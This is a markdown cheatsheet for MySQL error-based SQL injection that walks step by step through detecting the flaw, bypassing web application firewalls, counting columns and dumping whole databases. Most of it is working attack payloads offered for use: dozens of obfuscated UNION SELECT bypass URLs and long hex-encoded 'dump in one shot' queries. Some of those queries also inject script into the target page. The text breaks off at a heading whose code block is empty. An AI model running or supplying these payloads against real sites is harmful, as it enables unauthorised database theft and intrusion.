# MySQL Error based SQL Injection Cheatsheet

This is probably the easiest vulnerability along the SQL Injection attack. An attacker can enumerate and dump the MySQL database by using the SQL error messages to his advantage.

## Detecting the vulnerability
```http://domain.com/index.php?id=1```  
Website loads successfully  

```http://domain.com/index.php?id=1'```   
Error message shows up: ```You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...```  

```http://domain.com/index.php?id=1\'```   
Error message shows up: ```You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...```  

```http://domain.com/index.php?id=1 and 0' order by 1--+```  
Website loads successfully

```http://domain.com/index.php?id=2-1```  
Website loads successfully

```http://domain.com/index.php?id=-1'```  
Error message shows up again

```http://domain.com/index.php?id=-1)'```  
Error message shows up again

```http://domain.com/index.php?id=1'-- -```  
Website might loads successfuly, but it might shows error also

```http://domain.com/index.php?id=1'--```  
Website might loads successfuly, but it might shows error also

```http://domain.com/index.php?id=1+--+```  
Website might loads successfuly, but it might shows error also

## Bypassing WAF to detect the vulnerability (if the first methodology didn't work)

In some cases, WAF won't let you to cause errors on the website, so sending special queries might be needed to bypass WAF.

```http://domain.com/index.php?id=1'--/**/-```  
If no WAF Warning is shown and website loads up, we confirm the vulnerability, else try the following payloads.

```http//domain.com/index.php?id=/^.*1'--+-.*$/```  
```http//domain.com/index.php?id=/*!500001'--+-*/```  
```http//domain.com/index.php?id=1'--/**/-```  
```http//domain.com/index.php?id=1'--/*--*/-```  
```http//domain.com/index.php?id=1'--/*&a=*/-```  
```http//domain.com/index.php?id=1'--/*1337*/-```  
```http//domain.com/index.php?id=1'--/**_**/-```  
```http//domain.com/index.php?id=1'--%0A-```  
```http//domain.com/index.php?id=1'--%0b-```  
```http//domain.com/index.php?id=1'--%0d%0A-```  
```http//domain.com/index.php?id=1'--%23%0A-```  
```http//domain.com/index.php?id=1'--%23foo%0D%0A-```  
```http//domain.com/index.php?id=1'--%23foo*%2F*bar%0D%0A-```  
```http//domain.com/index.php?id=1'--#qa%0A#%0A-```  
```http//domain.com/index.php?id=/*!20000%0d%0a1'--+-*/```  
```http//domain.com/index.php?id=/*!blobblobblob%0d%0a1'--+-*/```  

## Find the number of columns using 'ORDER BY' query  

Now that we performed an SQL syntax error to the website, we can begin fuzzing and finding how many columns do we have by using ORDER BY

```http://domain.com/index.php?id=1' order by 1-- -```  
This query musn't shows up error, since there is no lower number than 1  

- If the payload shows up error, try setting a negative value:  
```http://domain.com/index.php?id=-1' order by 1-- -```  
This query musn't shows up error, since there is no lower number than 1  

  - If the payload shows up error, try removing the quote which might cause SQL error:
  ```http://domain.com/index.php?id=605 order by 1-- -```  
  ```http://domain.com/index.php?id=-605 order by 1-- -```  
 These both queries musn't shows up error. If error is still ocurring, try the following payloads:

    - If both of payloads don't work, it is problably a WAF blocking it. Try the following blocks until you won't see WAF detection or SQL syntax error.  
```
http://domain.com/index.php?id=1' order by 1 desc-- -  
http://domain.com/index.php?id=1' group by 1-- -  
http://domain.com/index.php?id=1' group by 1-- -  
http://domain.com/index.php?id=1' /**/ORDER/**/BY/**/ 1-- -  
http://domain.com/index.php?id=-1' /*!order*/+/*!by*/ 1-- -  
http://domain.com/index.php?id=1' /*!ORDER BY*/ 1-- -  
http://domain.com/index.php?id=1'/*!50000ORDER*//**//*!50000BY*/ 1-- -  
http://domain.com/index.php?id=1' /*!12345ORDER*/+/*!BY*/ 1-- -  
http://domain.com/index.php?id=1' /*!50000ORDER BY*/ 1-- -  
http://domain.com/index.php?id=1' order/**_**/by 1-- -  
http://domain.com/index.php?id=1\ order by 1-- -  
http://domain.com/index.php?id=1' order by 1 asc-- -  
http://domain.com/index.php?id=1' group by 1 asc-- -  
http://domain.com/index.php?id=1' AND 0 order by 1-- -  
http://domain.com/index.php?id=1%0Aorder%0Aby%0A1-- -  
http://domain.com/index.php?id=1%23%0Aorder%23%0Aby%23%0A1-- -  
http://domain.com/index.php?id=1%23aa%0Aorder%23aa%0Aby%23aa%0A1-- -  
http://domain.com/index.php?id=1%23xyz%0Aorder%23xyz%0Aby%23xyz%0A1-- -  
http://domain.com/index.php?id=1%23foo%0D%0Aorder%23foo%0D%0Aby%23foo%0D%0A1-- -  
http://domain.com/index.php?id=1%23foo*%2F*bar%0D%0Aorder%23foo*%2F*bar%0D%0Aby%23foo*%2F*bar%0D%0A1-- -  
http://domain.com/index.php?id=1/*!20000%0d%0a+order+by+*/1-- -  
http://domain.com/index.php?id=1/*!blobblobblob%0d%0a+order+by+*/1-- -  
http://domain.com/index.php?id=1/*!f****U%0d%0a+order+by+*/1-- -  
```

    
    - If none of the payloads didn't bypass WAF, try again the payloads by following the 2 rules below:
      - Add a minus (-) before 1 (example: ```?id=-1' /**/ORDER/**/BY/**/ 1-- -```)  
      - Remove the quote (') after the parameter value (example: ```?id=1 /**/ORDER/**/BY/**/ 1-- -```)

In this case, the payload ```?id=1 order by 1-- -``` worked and website loads successfuly. Now it is time to find the correct number of columns. Now let's use the payload that worked, and try increasing the number by 1, untill an error shows up: 

```http://domain.com/index.php?id=1 order by 1-- -``` no error  
```http://domain.com/index.php?id=1 order by 2-- -```  no error  
```http://domain.com/index.php?id=1 order by 3-- -```  no error  
```http://domain.com/index.php?id=1 order by 4-- -```  no error  
```http://domain.com/index.php?id=1 order by 5-- -```  error:   
```Unknown column '5' in 'order clause'Unknown column '5' in 'order clause'```  

This means there are only 4 columns. Now we have to find which one of these 4 columns have information.  

## Find the vulnerable column where information are stored using 'UNION SELECT' query  

Using a simple query, we determine which of the 4 columns reflect our input using. Only 1 of these payloads will run without **syntax error**. *NOTE: If none worked, try the same payloads, but remove the quote (') after number 1.*    

```http://domain.com/index.php?id=1' Union Select 1,2,3,4-- -```  
```http://domain.com/index.php?id=-1 Union Select 1,2,3,4-- -```  
```http://domain.com/index.php?id=-1' Union Select 1,2,3,4-- -```  
```http://domain.com/index.php?id=1'+UNION+ALL+SELECT+null,null,null,null--+-```  
```http://domain.com/index.php?id=1' Union Select null,2,3,4-- -```  
```http://domain.com/index.php?id=1' Union Select 1,null,3,4-- -```  
```http://domain.com/index.php?id=1' Union Select 1,2,null,4-- -```  
```http://domain.com/index.php?id=1' Union Select 1,2,3,null-- -```  
```http://domain.com/index.php?id=.1' Union Select 1,2,3,4-- -```  
```http://domain.com/index.php?id=-1' div 0' Union Select 1,2,3,4-- -```  
```http://domain.com/index.php?id=1' Union Select 1,2,3,4 desc-- -```  
```http://domain.com/index.php?id=1' AND 0 Union Select 1,2,3,4-- -```  

Website must successfully load and we will see a number (in our case between 1-4)  

![union_select_vuln_column](https://i.imgur.com/iV4rKcB.png)  

  - If the queries will not work, try the following payloads until you see the number (refer to the image):  
  
```http://domain.com/index.php?id=1+UNION+SELECT+1,2,3,4--+-```  
```http://domain.com/index.php?id=1+UNION+ALL+SELECT+1,2,3,4--+-```  
```http://domain.com/index.php?id=1+UNION+ALL+SELECT+1,2,3,4--+-```  
```http://domain.com/index.php?id=1+UNION+ALL+SELECT+null,null,null,null--+-```  
```http://domain.com/index.php?id=1 UNION(SELECT(1),(2),(3),(4))-- -```  
```http://domain.com/index.php?id=1 +Union Distinctrow Select+1,2,3,4-- -```  
```http://domain.com/index.php?id=1+UNION+ALL+SELECT+13371,13372,13373,13374--+-```  
```http://domain.com/index.php?id=1+UNION+ALL+SELECT+1%2c2%2c3%2c4--+-```  
```http://domain.com/index.php?id=1 Union Select CHAR(49),CHAR(50),CHAR(51),CHAR(52)-- -```  
```http://domain.com/index.php?id=1 %23%0AUnion%23aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0ASelect%23%0A1,2,3,4-- -``` (buffer by a * 300)  
 ```http://domain.com/index.php?id=Union Select * from (select 1)a join(select 2)b join(select 3)c join(select 4)d-- -```  

    - If the queries still doesn't show the vulnerable column number, it is probably the WAF blocking our queries. Let's try injection payloads which bypass it.   
    
    http://domain.com/index.php?id=1 /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 %55nion(%53elect 1,2,3) 1,2,3,4-- -  
    http://domain.com/index.php?id=1+union+distinctROW+select+1,2,3,4--+-  
    http://domain.com/index.php?id=1+ #?uNiOn + #?sEleCt 1,2,3,4-- -  
    http://domain.com/index.php?id=1 + #?1q %0AuNiOn all#qa%0A#%0AsEleCt 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*!%55NiOn*/ /*!%53eLEct*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 +un/**/ion+se/**/lect 1,2,3,4-- -  
    http://domain.com/index.php?id=1 +?UnI?On?+'SeL?ECT? 1,2,3,4-- -  
    http://domain.com/index.php?id=1+(UnIoN)+(SelECT)+1,2,3,4--+-  
    http://domain.com/index.php?id=1 +UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 %55nion(%53elect 1,2,3,4)-- -  
    http://domain.com/index.php?id=1 /**//*!12345UNION SELECT*//**/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /**//*!50000UNION SELECT*//**/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /**/UNION/**//*!50000SELECT*//**/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*!50000UniON SeLeCt*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 union /*!50000%53elect*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*--*/union/*--*/select/*--*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 union (/*!/**/ SeleCT */ 1,2,3,4)-- -  
    http://domain.com/index.php?id=1 /*!union*/+/*!select*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /**/uNIon/**/sEleCt/**/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 +%2F**/+Union/*!select*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /**//*!union*//**//*!select*//**/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*!uNIOn*/ /*!SelECt*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /**/union/*!50000select*//**/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 0%a0union%a0select%09 1,2,3,4-- -  
    http://domain.com/index.php?id=1 %0Aunion%0Aselect%0A 1,2,3,4-- -  
    http://domain.com/index.php?id=1 uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 %252f%252a*/UNION%252f%252a /SELECT%252f%252a*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*!union*//*--*//*!all*//*--*//*!select*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C 1,2,3,4-- -
    http://domain.com/index.php?id=1 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 +UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 union+sel%0bect 1,2,3,4-- -  
    http://domain.com/index.php?id=1 +#1q%0Aunion all#qa%0A#%0Aselect 1,2,3,4-- -  
    http://domain.com/index.php?id=1 %23xyz%0AUnIOn%23xyz%0ASeLecT+ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 %23xyz%0A%55nIOn%23xyz%0A%53eLecT+ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 union(select(1),2,3)-- -  
    http://domain.com/index.php?id=1 uNioN (/*!/**/ SeleCT */ 11) 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 %0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 +union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 +UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 +/*!UnIoN*/+/*!SeLeCt*/+ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 uni%20union%20/*!select*/%20 1,2,3,4-- -  
    http://domain.com/index.php?id=1 union%23aa%0Aselect 1,2,3,4-- -  
    http://domain.com/index.php?id=1/**/union/*!50000select*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /^****union.*$/ /^****select.*$/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*union*/union/*select*/select+ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 /*!50000UnION*//*!50000SeLeCt*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 %252f%252a*/union%252f%252a /select%252f%252a*/ 1,2,3,4-- -  
    http://domain.com/index.php?id=1 AnD null UNiON SeLeCt 1,2,3,4;%00-- -  
    http://domain.com/index.php?id=1 AnD null UNiON SeLeCt 1,2,3,4+--+-  
    http://domain.com/index.php?id=1 And False Union Select 1,2,3,4+--+-  
    

We bypassed the WAF and found that the 1st column has the information (please refer to the photo).

### UNION SELECT case: The vulnerable column is not being displayed
Sometimes when we manage to bypass the WAF when using **UNION SELECT** query, we don't see the vulnerable column printed out in the page source (or content). A solution would be to force the server print out the vulnerable column, by using the following tricks:  

1) add **-** before the GET/POST parameter value, for example:  
```sql
?id=-7' UNION SELECT 1,2,3,4--+
```

2) add **.** before the GET/POST parameter value, for example:  
```sql
?id=.7' UNION SELECT 1,2,3,4--+
```

3) Use **AND 1** or **AND 0** after the GET/POST parameter value, for example:  
```sql
?id=7' AND 0 UNION SELECT 1,2,3,4--+
```

4) Use **DIV 0** or **DIV 1** after the GET/POST parameter value, for example:  
```sql
?id=7' DIV 1 UNION SELECT 1,2,3,4--+
```

**Note:** If **AND** or **DIV** are being blocked by WAF, consider using the alternative methods for [AND alternative](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/The%20Alternative%20way%20of%20using%20And%200%20in%20SQL%20Injection/README.md) and [NULL alternative](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/The%20Alternative%20way%20of%20using%20Null%20in%20SQL%20Injection/README.md)

## Retrieving the database  

### Dumping with DIOS  

#### What is DIOS?
DIOS (dump in one shot), is a long crafted payload which will dump database(), tables() and columns() and will display it in the website. The photo below is DIOS in action:  

![dios_payload_executed](https://i.imgur.com/lShEJo7.jpg)  

- Here is a list of MySQL DIOS payloads:  

```
concat/*!(0x223e,version(),(select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/
```  

```
concat/*!(0x3c68323e20496e6a656374657220414c49454e205348414e553c2f68323e,0x3c62723e,version(),(Select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/
```

```
concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c696d67207372633d2268747470733a2f2f312e62702e626c6f6773706f742e636f6d2f2d456262354b36356f4a49552f56336171695854394671492f41414141414141414353452f76475977714c6c504f73733251574c376e335874794a5376515a2d367a41672d77434c63422f73313630302f486f77253242746f253242496e637265617365253242496e7465726e657425324242726f77736572732532425370656564253242696e25324255726475253242616e6425324248696e6469253242566964656f2532425475746f7269616c2e504e47223e3c666f6e7420636f6c6f723d7265642073697a653d353e3c623e4d722e73696c656e7420636f646572203c666f6e7420636f6c6f723d626c61636b2073697a653d343e2866336d6178293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c6669656c647365743e3c7374726f6e673e3c62723e3c63656e7465723e3c623e3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e20203c666f6e7420636f6c6f723d626c61636b3e,version(),0x7e20,@@version_comment,0x3c2f666f6e743e,0x3c62723e5072696d617279204461746162617365203c666f6e7420636f6c6f723d626c61636b3e20203a3a,@d:=database() ,0x3c2f666f6e743e ,0x3c62723e44617461626173652055736572203c666f6e7420636f6c6f723d626c61636b3e203a3a,user(),0x3c2f666f6e743e,0x3c2f623e3c62723e,(SELECT+GROUP_CONCAT(0x50726976696c656765732020203c666f6e7420636f6c6f723d626c61636b3e203a3a,GRANTEE,0x3a3a,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),0x3c2f63656e7465723e3c2f7374726f6e673e3c2f6669656c647365743e,(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c6669656c647365743e3c6c6567656e643e,0x3c623e3c666f6e7420636f6c6f723d626c61636b3e,'Table Name',0x3c2f6c6567656e643e3c2f666f6e743e3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name, 0x3c623e3c666f6e7420636f6c6f723d677265656e3e3a3a20446174616261736520203c666f6e7420636f6c6f723d626c61636b3e5b,database(),0x5d3c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e3c2f623e3c2f6669656c647365743e))))x)))))*/
```

```
concat(0x3c7363726970743e6e616d653d70726f6d70742822506c6561736520456e74657220596f7572204e616d65203a2022293b2075726c3d70726f6d70742822506c6561736520456e746572205468652055726c20796f7527726520747279696e6720746f20496e6a65637420616e6420777269746520276d616b6d616e2720617420796f757220496e6a656374696f6e20506f696e742c204578616d706c65203a20687474703a2f2f736974652e636f6d2f66696c652e7068703f69643d2d3420554e494f4e2053454c45435420312c322c332c636f6e6361742830783664363136622c6d616b6d616e292c352d2d2b2d204e4f5445203a204a757374207265706c61636520796f757220496e6a656374696f6e20706f696e742077697468206b6579776f726420276d616b6d616e2722293b3c2f7363726970743e,0x3c623e3c666f6e7420636f6c6f723d7265643e53514c69474f44732053796e746178205620312e30204279204d616b4d616e3c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d343e496e6a6563746564206279203c7363726970743e646f63756d656e742e7772697465286e616d65293b3c2f7363726970743e3c2f666f6e743e3c62723e3c7461626c6520626f726465723d2231223e3c74723e3c74643e44422056657273696f6e203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,version(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e2044422055736572203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,user(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e5072696d617279204442203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,database(),0x203c2f74643e3c2f74723e3c2f7461626c653e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e43686f6f73652061207461626c652066726f6d207468652064726f70646f776e206d656e75203a203c2f666f6e743e3c62723e,concat(0x3c7363726970743e66756e6374696f6e20746f48657828737472297b76617220686578203d27273b666f722876617220693d303b693c7374722e6c656e6774683b692b2b297b686578202b3d2027272b7374722e63686172436f646541742869292e746f537472696e67283136293b7d72657475726e206865783b7d66756e6374696f6e2072656469726563742873697465297b6d616b73706c69743d736974652e73706c697428222e22293b64626e616d653d6d616b73706c69745b305d3b74626c6e616d653d6d616b73706c69745b315d3b6d616b7265703d22636f6e636174284946284074626c3a3d3078222b746f4865782874626c6e616d65292b222c3078302c307830292c4946284064623a3d3078222b746f4865782864626e616d65292b222c3078302c307830292c636f6e6361742830783363373336333732363937303734336537353732366333643232222b746f4865782875726c292b2232323362336332663733363337323639373037343365292c636f6e63617428636f6e6361742830783363373336333732363937303734336536343632336432322c4064622c307832323362373436323663336432322c4074626c2c3078323233623363326637333633373236393730373433652c30783363363233653363363636663665373432303633366636633666373233643732363536343365323035333531346336393437346634343733323035333739366537343631373832303536323033313265333032303432373932303464363136623464363136653363326636363666366537343365336336323732336533633632373233653534363136323663363532303465363136643635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4074626c2c3078336332663636366636653734336532303636373236663664323036343631373436313632363137333635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4064622c307833633266363636663665373433653363363237323365346537353664363236353732323034663636323034333666366337353664366537333230336132303363363636663665373432303633366636633666373233643632366337353635336533633733363337323639373037343365363336663663363336653734336432322c2853454c45435420636f756e7428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d40646220616e64207461626c655f6e616d653d4074626c292c3078323233623634366636333735366436353665373432653737373236393734363532383633366636633633366537343239336233633266373336333732363937303734336533633266363636663665373433652c307833633632373233652c2873656c65637420284078292066726f6d202873656c656374202840783a3d30783030292c284063686b3a3d31292c202873656c656374202830292066726f6d2028696e666f726d6174696f6e5f736368656d612e636f6c756d6e732920776865726520287461626c655f736368656d613d3078222b746f4865782864626e616d65292b222920616e6420287461626c655f6e616d653d3078222b746f4865782874626c6e616d65292b222920616e642028307830302920696e202840783a3d636f6e6361745f777328307832302c40782c4946284063686b3d312c30783363373336333732363937303734336532303633366636633665363136643635323033643230366536353737323034313732373236313739323832393362323037363631373232303639323033643230333133622c30783230292c30783230363336663663366536313664363535623639356432303364323032322c636f6c756d6e5f6e616d652c307832323362323036393262326233622c4946284063686b3a3d322c307832302c30783230292929292978292c30783636366637323238363933643331336236393363336436333666366336333665373433623639326232623239376236343666363337353664363536653734326537373732363937343635323832323363363636663665373432303633366636633666373233643637373236353635366533653232326236393262323232653230336332663636366636653734336532323262363336663663366536313664363535623639356432623232336336323732336532323239336237643363326637333633373236393730373433652c636f6e6361742830783363363233652c307833633733363337323639373037343365373137353635373237393364323232323362363636663732323836393364333133623639336336333666366336333665373433623639326232623239376237313735363537323739336437313735363537323739326236333666366336653631366436353562363935643262323232633330373833323330333336313333363133323330326332323362376437353732366333643735373236633265373236353730366336313633363532383232323732323263323232353332333732323239336236343664373037313735363537323739336437353732366332653732363537303663363136333635323832323664363136623664363136653232326332323238373336353663363536333734323834303239323036363732366636643238373336353663363536333734323834303361336433303738333033303239323032633238373336353663363536333734323032383430323932303636373236663664323832323262363436323262323232653232326237343632366332623232323937373638363537323635323834303239323036393665323032383430336133643633366636653633363137343566373737333238333037383332333032633430326332323262373137353635373237393262323233303738333336333336333233373332333336353239323932393239363132393232323933623634366636333735366436353665373432653737373236393734363532383232336336313230363837323635363633643237323232623634366437303731373536353732373932623232323733653433366336393633366232303438363537323635323037343666323034343735366437303230373436383639373332303737363836663663363532303534363136323663363533633631336532323239336233633266373336333732363937303734336529292929223b75726c3d75726c2e7265706c616365282227222c2225323722293b75726c706173313d75726c2e7265706c61636528226d616b6d616e222c6d616b726570293b77696e646f772e6f70656e2875726c70617331293b7d3c2f7363726970743e3c73656c656374206f6e6368616e67653d22726564697265637428746869732e76616c756529223e3c6f7074696f6e2076616c75653d226d6b6e6f6e65222073656c65637465643e43686f6f73652061205461626c653c2f6f7074696f6e3e,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.tables) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=concat(@x,0x3c6f7074696f6e2076616c75653d22,UNHEX(HEX(table_schema)),0x2e,UNHEX(HEX(table_name)),0x223e,UNHEX(HEX(concat(0x4461746162617365203a3a20,table_schema,0x203a3a205461626c65203a3a20,table_name))),0x3c2f6f7074696f6e3e))))x),0x3c2f73656c6563743e),0x3c62723e3c62723e3c62723e3c62723e3c62723e)
```

```
concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)
```

```
(select+concat(0x3c666f6e7420666163653d43616d627269612073697a653d323e72306f74404833583439203a3a20,version(),0x3c666f6e7420636f6c6f723d7265643e3c62723e,0x446174616261736573203a7e205b,(Select+count(Schema_name)from(information_Schema.schemata)),0x5d3c62723e5461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)),0x5d3c62723e436f6c756d6e73203a7e205b,(Select+count(column_name)from(information_Schema.columns)),0x5d3c62723e,@)from(select(@:=0x00),(@db:=0),(@db_nr:=0),(@tbl:=0),(@tbl_nr:=0),(@col_nr:=0),(select(@)from(information_Schema.columns)where(@)in(@:=concat(@,if((@db!=table_schema),concat((@tbl_nr:=0x00),0x3c666f6e7420636f6c6f723d7265643e,LPAD(@db_nr:=@db_nr%2b1,2,0x20),0x2e20,@db:=table_schema,0x2020202020203c666f6e7420636f6c6f723d707572706c653e207b205461626c6573203a7e205b,(Select+count(table_name)from(information_schema.tables)where(table_schema=@db)),0x5d7d203c2f666f6e743e3c2f666f6e743e),0x00),if((@tbl!=table_name),concat((@col_nr:=0x00),0x3c646976207374796c653d70616464696e672d6c6566743a343070783b3e3c666f6e7420636f6c6f723d626c75653e202020,LPAD(@tbl_nr:=@tbl_nr%2b1,3,0x0b), 0x2e20,@tbl:=table_name,0x20202020203c666f6e7420636f6c6f723d707572706c653e2020207b2020436f6c756d6e73203a7e20205b,(Select+count(column_name)from(information_Schema.columns)where(table_name=@tbl)),0x5d202f203c666f6e7420636f6c6f723d626c61636b3e205265636f726473203a7e205b,(Select+ifnull(table_rows,0x30)+from+information_schema.tables+where+table_name=@tbl),0x5d207d3c2f666f6e743e3c2f666f6e743e3c2f666f6e743e3c2f6469763e),0x00),concat(0x3c646976207374796c653d70616464696e672d6c6566743a383070783b3e3c666f6e7420636f6c6f723d677265656e3e,LPAD(@col_nr:=@col_nr%2b1,3,0x0b),0x2e20,column_name,0x3c2f666f6e743e3c2f6469763e)))))x)
```  


- Here is a list of DIOS payloads (WAF Bypass):

```
